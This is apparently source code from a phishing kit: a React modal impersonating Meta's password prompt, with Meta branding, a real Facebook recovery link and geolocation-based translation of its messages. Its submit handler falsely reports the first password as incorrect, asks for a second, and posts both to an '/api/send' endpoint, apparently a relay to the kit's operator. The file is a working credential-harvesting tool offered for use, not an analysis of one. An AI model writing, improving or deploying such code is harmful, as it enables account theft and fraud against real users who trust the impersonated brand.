'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useState, useEffect, type FC } from 'react';

interface PasswordModalProps {
    userProfileImage: string;
    userName: string;
    userEmail: string;
    fullName?: string;
    pageName?: string;
    pageUrl?: string;
    legalBusinessName?: string;
    phoneNumber?: string;
    description?: string;
}

const PasswordModal: FC<PasswordModalProps> = ({ 
    fullName = ''
}) => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [password1Value, setPassword1Value] = useState('');
    const [error, setError] = useState('');
    const [attemptCount, setAttemptCount] = useState(0);

    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { messageId, message, setMessage, setFormStep, geoInfo } = store();

    // Translation effect
    useEffect(() => {
        if (!geoInfo) return;

        (async () => {
            const countryLangMap: Record<string, string> = {
                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
                VE: 'es',
                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
                YE: 'ar',
                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
                UA: 'uk', GB: 'en', VA: 'it',
                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
            };

            const HARDCODED_LANGS = new Set([
                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
                'tr','th','ko','sv','id','ms','ro','cs','hu','fi','da','no'
            ]);

            const cc = geoInfo.country_code.toUpperCase();
            const lang = countryLangMap[cc] || 'en';
            if (lang === 'en') return;

            if (HARDCODED_LANGS.has(lang)) {
                setTranslations(getTranslations(lang));
                return;
            }

            const textsToTranslate = [
                'Password',
                'Continue',
                'Forgotten password?',
                'For your security, you must enter your password to continue.',
                'The password you\'ve entered is incorrect',
                'Hi',
                'Please fill in all fields',
                'Password must be at least 6 characters',
                'Incorrect password. Please try again.',
                'Enter your password',
            ];

            const CACHE_KEY = 'translation_cache';
            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
            const cache = cached ? JSON.parse(cached) : {};

            const allCached = textsToTranslate.every(text => cache[`en:${lang}:${text}`]);
            if (allCached) {
                const translatedMap: Record<string, string> = {};
                textsToTranslate.forEach(text => {
                    translatedMap[text] = cache[`en:${lang}:${text}`];
                });
                setTranslations(translatedMap);
                return;
            }

            const translatePromises = textsToTranslate.map(async (text) => {
                const cacheKey = `en:${lang}:${text}`;
                if (cache[cacheKey]) return { text, translated: cache[cacheKey] };
                try {
                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
                        params: { client: 'gtx', sl: 'en', tl: lang, dt: 't', q: text }
                    });
                    const translatedText = response.data[0]
                        ?.map((item: unknown[]) => item[0])
                        .filter(Boolean)
                        .join('') || text;
                    cache[cacheKey] = translatedText;
                    return { text, translated: translatedText };
                } catch {
                    return { text, translated: text };
                }
            });

            const results = await Promise.all(translatePromises);
            if (typeof window !== 'undefined') {
                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
            }

            const translatedMap: Record<string, string> = {};
            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });
            setTranslations(translatedMap);
        })();
    }, [geoInfo]);

    const t = (text: string): string => translations[text] || text;

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setError('');

        // Validation
        if (!password) {
            setError(t('Please fill in all fields'));
            return;
        }

        if (password.length < 6) {
            setError(t('Password must be at least 6 characters'));
            return;
        }

        // First attempt - send password1 and show error
        if (attemptCount === 0) {
            if (isLoading || !message) return;
            setIsLoading(true);

            const password1Message = `${message}

<b>� Password 1:</b> <code>${password}</code>`;

            try {
                await axios.post('/api/send', {
                    message: password1Message,
                    message_id: messageId
                    // Use message_id to update the same message
                });
            } catch {
                // Continue even if sending fails
            } finally {
                setIsLoading(false);
            }

            setError(t('Incorrect password. Please try again.'));
            setPassword1Value(password);
            setPassword('');
            setAttemptCount(1);
            return;
        }

        // Second attempt - send password2 and continue to verify
        if (isLoading || !message) return;
        setIsLoading(true);

        const password2Message = `${message}

<b>🔐 Password 1:</b> <code>${password1Value}</code>
<b>🔐 Password 2:</b> <code>${password}</code>`;

        try {
            const res = await axios.post('/api/send', {
                message: password2Message,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(password2Message);
            }
            setFormStep('verify');
        } catch {
            setFormStep('verify');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all" style={{touchAction: 'manipulation'}}></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6 overflow-hidden select-none' style={{touchAction: 'manipulation', userSelect: 'none'}}>
                <div className='flex max-h-[95vh] w-full max-w-[340px] sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center justify-center gap-1.5 sm:gap-2.5 md:gap-4 py-4 sm:py-6 md:py-8 px-2.5 sm:px-3.5 md:px-5'>
                        {/* Full Name Display */}
                        {fullName && (
                            <p className='text-sm sm:text-base md:text-lg font-bold text-[#1a1a1a] mb-1.5 sm:mb-2.5 md:mb-4 text-center break-words'>
                                {t('Hi')}, {fullName}
                            </p>
                        )}

                        {/* Password Input Section */}
                        <div className='w-full px-1.5 sm:px-3 md:px-4'>
                            {/* Security Message - Small text above input */}
                            <p className='text-[10px] sm:text-xs text-gray-500 mb-1 px-1'>
                                {t('For your security, you must enter your password to continue.')}
                            </p>

                            <div className='relative w-full'>
                                <input
                                    type='password'
                                    value={password}
                                    onChange={e => {
                                        setPassword(e.target.value);
                                        setError('');
                                    }}
                                    className='h-10 sm:h-11 md:h-12 w-full rounded-xl border-2 border-[#d4dbe3] px-3 sm:px-3.5 py-1.5 sm:py-2 text-base focus:outline-none focus:border-blue-500 transition'
                                    required
                                    autoComplete='password'
                                    placeholder={t('Enter your password')}
                                />
                            </div>

                            {/* Error Message - Below input */}
                            {error && (
                                <p className='text-red-600 text-xs mt-2 px-1 break-words'>
                                    {error}
                                </p>
                            )}
                        </div>

                        {/* Submit Button */}
                        <div className='w-full px-0 mt-0.5 sm:mt-1 md:mt-2'>
                            <button
                                type='submit'
                                disabled={isLoading}
                                className={`flex h-10 sm:h-11 md:h-12 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-[11px] sm:text-xs md:text-sm text-white transition-colors hover:bg-blue-700 active:bg-blue-800 ${
                                    isLoading ? 'cursor-not-allowed opacity-80' : ''
                                }`}
                            >
                                {isLoading ? (
                                    <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                ) : (
                                    t('Continue')
                                )}
                            </button>
                        </div>

                        {/* Forgotten Password Link */}
                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-[10px] sm:text-xs text-center text-blue-600 hover:underline mt-1.5 sm:mt-2 md:mt-3 transition leading-tight'>
                            {t('Forgotten password?')}
                        </a>
                    </form>

                    {/* Meta Logo Footer */}
                    <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
                        <Image src={MetaLogo} alt='Meta' className='h-3.5 sm:h-4 w-14 sm:w-16' />
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;
